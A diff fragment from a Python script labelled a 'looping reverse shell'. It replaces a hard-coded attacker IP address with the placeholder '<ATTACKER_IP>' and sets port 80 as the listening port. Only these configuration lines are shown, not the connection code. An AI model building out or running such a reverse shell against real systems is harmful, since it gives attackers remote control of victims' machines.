@@ -7,7 +7,7 @@ import time
 Looping reverse shell
 '''
 def main():
-    ATTACKER_IP = '10.0.0.63'
+    ATTACKER_IP = '<ATTACKER_IP>'
     ATTACKER_LISTENING_PORT = 80
 
     counter = 0
